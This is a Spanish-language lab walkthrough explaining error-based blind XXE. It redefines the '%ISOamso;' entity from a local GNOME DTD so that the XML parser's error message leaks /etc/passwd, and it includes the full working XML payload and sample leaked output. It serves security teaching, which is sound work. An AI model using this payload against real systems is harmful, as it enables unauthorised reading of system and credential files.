# 🗄️ XXE usando DTD local para extraer datos

## 📄 Descripción del laboratorio

Este laboratorio mantiene la funcionalidad de **Comprobar existencias**, que procesa XML de forma ciega, sin reflejar valores ni resultados útiles en la respuesta normal.

Además, las técnicas habituales de XXE están fuertemente restringidas:

* Entidades externas directas
* DTD externas
* _Parameter entities_ clásicas
* Canales _out-of-band_

Sin embargo, el servidor sí permite cargar **DTD locales del sistema de archivos**, lo que abre un vector de explotación más avanzado.

La pista clave del laboratorio indica que en sistemas Linux con entorno GNOME existe el siguiente DTD:

```
/usr/share/yelp/dtd/docbookx.dtd
```

Este DTD define una entidad interna llamada `%ISOamso;`.

### 🎯 Objetivo

Extraer el contenido del archivo:

```
/etc/passwd
```

utilizando un **DTD local del sistema** y el **mensaje de error del parser XML** como canal de exfiltración.



## 📚 Teoría

Cuando una aplicación bloquea las técnicas XXE más comunes, todavía puede quedar una vía muy útil: **reutilizar DTDs locales ya presentes en el sistema**.

En muchos entornos Linux, especialmente con componentes de GNOME o Yelp, existen archivos DTD instalados localmente que incluyen:

* entidades internas predefinidas
* estructuras reutilizables
* nombres de entidades que pueden redefinirse

En este laboratorio, una de esas entidades es:

```
%ISOamso;
```

### 📌 Por qué funciona

El parser XML:

* carga el DTD local legítimo
* acepta redefiniciones de entidades internas
* procesa esas entidades durante el parsing
* devuelve errores detallados si algo falla

Si redefinimos `%ISOamso;` para que:

* lea `/etc/passwd`
* construya una ruta inválida que contenga ese contenido

el parser intentará acceder a una ruta como:

```
file:///nonexistent/root:x:0:0:root:/root:/bin/bash
```

Ese intento fallará y el mensaje de error incluirá la ruta completa, dejando incrustado el contenido del archivo en la respuesta HTTP.

De esta forma, se consigue exfiltración **sin usar entidades externas remotas ni canales OOB**.



## 📝 Práctica

### 1️⃣ Análisis inicial

Interceptamos la petición **POST** de **Check stock** y la enviamos a **Burp Repeater**.

Comprobamos que:

* no hay reflejo de datos útiles
* las técnicas XXE clásicas no funcionan
* los errores del parser sí se devuelven completos

Esto confirma que el canal de exfiltración será el **mensaje de error**.



### 2️⃣ Construcción del payload final

Sabemos que existe el DTD local:

```
/usr/share/yelp/dtd/docbookx.dtd
```

y que define `%ISOamso;`.

El payload que permite explotar el laboratorio es el siguiente:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">

  <!ENTITY % ISOamso '
    <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
    <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; exfil SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
    &#x25;eval;
    &#x25;exfil;
  '>

  %local_dtd;
]>
<stockCheck>
  <productId>1</productId>
  <storeId>1</storeId>
</stockCheck>
```



### 3️⃣ Qué hace el payload

**`local_dtd`**

Carga el DTD legítimo del sistema:

```
file:///usr/share/yelp/dtd/docbookx.dtd
```

**`%ISOamso`**

Redefine una entidad ya existente en ese DTD.

Dentro de esa redefinición:

* se lee el archivo `/etc/passwd`
* se construye una ruta inválida bajo `file:///nonexistent/`
* se fuerza un error del parser

**`%local_dtd;`**

Hace que el DTD local se procese y dispare toda la cadena de entidades definida.



### 4️⃣ Exfiltración mediante mensaje de error

Enviamos la petición.

La respuesta del servidor contiene ahora un error detallado, por ejemplo:

```bash
java.io.FileNotFoundException: /nonexistent/root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
...
```

El contenido completo de:

```
/etc/passwd
```

aparece incrustado en la ruta del error.
